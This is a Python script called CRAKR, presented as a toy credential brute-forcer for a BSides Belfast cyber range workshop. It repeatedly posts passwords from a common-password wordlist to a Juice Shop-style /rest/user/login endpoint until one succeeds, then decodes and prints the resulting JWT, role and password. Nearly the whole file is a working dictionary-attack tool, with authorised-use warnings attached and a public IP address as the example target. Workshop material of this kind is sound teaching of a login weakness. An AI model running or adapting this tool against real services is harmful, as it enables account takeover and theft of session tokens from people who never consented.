#!/usr/bin/env python3
"""
CRAKR - toy credential brute-forcer for the BSides Belfast cyber range.

Demonstrates VULN-AUTH-001 (docs/vulnerability_flows/brute-force-login):
no rate limiting on /rest/user/login, no account lockout, so an attacker
can hammer the login endpoint with a wordlist until something sticks.

FOR WORKSHOP USE ONLY. Point this only at range instances you own or
have explicit permission to test.
"""

import argparse
import base64
import json
import os
import random
import sys
import time
import urllib.error
import urllib.request

RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
CYAN = "\033[36m"
MAGENTA = "\033[35m"

USE_COLOR = sys.stdout.isatty()


def c(text, *codes):
    if not USE_COLOR:
        return text
    return "".join(codes) + text + RESET


GLYPHS = {
    "C": [" ██████╗", "██╔════╝", "██║     ", "██║     ", "██║     ", "╚██████╗", " ╚═════╝"],
    "R": ["██████╗ ", "██╔══██╗", "██████╔╝", "██╔══██╗", "██║  ██║", "██║  ██║", "╚═╝  ╚═╝"],
    "A": [" █████╗ ", "██╔══██╗", "██║  ██║", "███████║", "██╔══██║", "██║  ██║", "╚═╝  ╚═╝"],
    "K": ["██╗  ██╗", "██║ ██╔╝", "█████╔╝ ", "██╔═██╗ ", "██║  ██╗", "██║  ██║", "╚═╝  ╚═╝"],
}


def banner():
    word = "CRAKR"
    rows = ["  ".join(GLYPHS[ch][r] for ch in word) for r in range(7)]
    print(c("\n".join(rows), BOLD, MAGENTA))
    print(c("        credential brute-forcer // BSides Belfast cyber range\n", DIM, CYAN))


DEFAULT_WORDLIST = [
    "password",
    "123456",
    "admin",
    "letmein",
    "qwerty",
    "admin123",
    "welcome1",
    "dragon",
    "master",
    "iloveyou",
]


def load_wordlist(path):
    if not path:
        return list(DEFAULT_WORDLIST)
    with open(path) as f:
        return [line.strip() for line in f if line.strip()]


def decode_jwt_payload(token):
    try:
        payload_b64 = token.split(".")[1]
        payload_b64 += "=" * (-len(payload_b64) % 4)
        return json.loads(base64.urlsafe_b64decode(payload_b64))
    except Exception:
        return {}


def attempt_login(base_url, email, password, timeout):
    url = base_url.rstrip("/") + "/rest/user/login"
    body = json.dumps({"email": email, "password": password}).encode()
    req = urllib.request.Request(
        url, data=body, headers={"Content-Type": "application/json"}, method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            data = json.loads(resp.read().decode())
            token = data.get("authentication", {}).get("token")
            return True, token
    except urllib.error.HTTPError:
        return False, None
    except urllib.error.URLError as e:
        return None, str(e)


def fake_scan_lines(n=3):
    charset = "0123456789ABCDEF"
    for _ in range(n):
        noise = " ".join("".join(random.choice(charset) for _ in range(4)) for _ in range(12))
        print(c(f"  {noise}", DIM, GREEN))
        time.sleep(0.08)


def main():
    parser = argparse.ArgumentParser(
        description="CRAKR - toy login brute-forcer for the cyber range workshop.",
        epilog="Example: crakr.py --target http://165.227.225.179",
    )
    parser.add_argument(
        "--target",
        default=os.environ.get("CRAKR_TARGET", "http://localhost"),
        help="Base URL of the target (nginx/Juice Shop front door). Default: $CRAKR_TARGET or http://localhost",
    )
    parser.add_argument("--email", default="admin@juice-sh.op", help="Account to attack")
    parser.add_argument("--wordlist", default=None, help="Path to a password wordlist (one per line)")
    parser.add_argument("--delay", type=float, default=0.35, help="Seconds between attempts (dramatic effect)")
    parser.add_argument("--fast", action="store_true", help="Skip delays, go as fast as possible")
    parser.add_argument("--timeout", type=float, default=5.0, help="Per-request HTTP timeout")
    args = parser.parse_args()

    delay = 0.03 if args.fast else args.delay

    banner()
    print(c("  [!] AUTHORISED WORKSHOP USE ONLY", BOLD, YELLOW))
    print(c("      Target only systems you own or have explicit permission to test.\n", YELLOW))

    print(f"  {c('TARGET', BOLD)}   {args.target}/rest/user/login")
    print(f"  {c('ACCOUNT', BOLD)}  {args.email}")
    wordlist = load_wordlist(args.wordlist)
    print(f"  {c('WORDLIST', BOLD)} {len(wordlist)} candidates\n")

    print(c("  [*] initialising attack module...", DIM))
    fake_scan_lines(3)
    print(c("  [*] no rate limiting detected on /rest/user/login", GREEN))
    print(c("  [*] no account lockout detected — beginning dictionary attack\n", GREEN))

    start = time.time()
    found_password = None
    found_token = None

    for i, password in enumerate(wordlist, start=1):
        masked = password[0] + "*" * max(len(password) - 1, 0)
        sys.stdout.write(f"  [{i:>2}/{len(wordlist)}] trying {c(masked, CYAN)} ... ")
        sys.stdout.flush()

        ok, extra = attempt_login(args.target, args.email, password, args.timeout)

        if ok is None:
            print(c("CONNECTION ERROR", BOLD, RED))
            print(c(f"\n  [!] could not reach {args.target} — {extra}", RED))
            print(c("  [!] check the target is up and reachable, then retry.\n", RED))
            sys.exit(1)

        if ok:
            print(c("SUCCESS", BOLD, GREEN))
            found_password = password
            found_token = extra
            break
        else:
            print(c("denied", DIM, RED))
            time.sleep(delay)

    elapsed = time.time() - start

    if not found_password:
        print(c("\n  [!] wordlist exhausted, no valid credentials found.", RED))
        sys.exit(1)

    claims = decode_jwt_payload(found_token) if found_token else {}
    role = claims.get("data", {}).get("role", "unknown")
    user_email = claims.get("data", {}).get("email", args.email)

    print()
    print(c("  " + "=" * 54, GREEN))
    print(c("  ACCESS GRANTED", BOLD, GREEN))
    print(c("  " + "=" * 54, GREEN))
    print(f"  account   : {c(user_email, BOLD)}")
    print(f"  password  : {c(found_password, BOLD, YELLOW)}")
    print(f"  role      : {c(role, BOLD)}")
    print(f"  attempts  : {wordlist.index(found_password) + 1}")
    print(f"  elapsed   : {elapsed:.2f}s")
    if found_token:
        print(f"  jwt       : {c(found_token[:60] + '...', DIM)}")
    print(c("  " + "=" * 54, GREEN))
    print()
    print(c("  [*] this account has no rate limiting, no lockout, and its", DIM))
    print(c("      token can now be replayed to call any admin endpoint.", DIM))
    print()


if __name__ == "__main__":
    main()
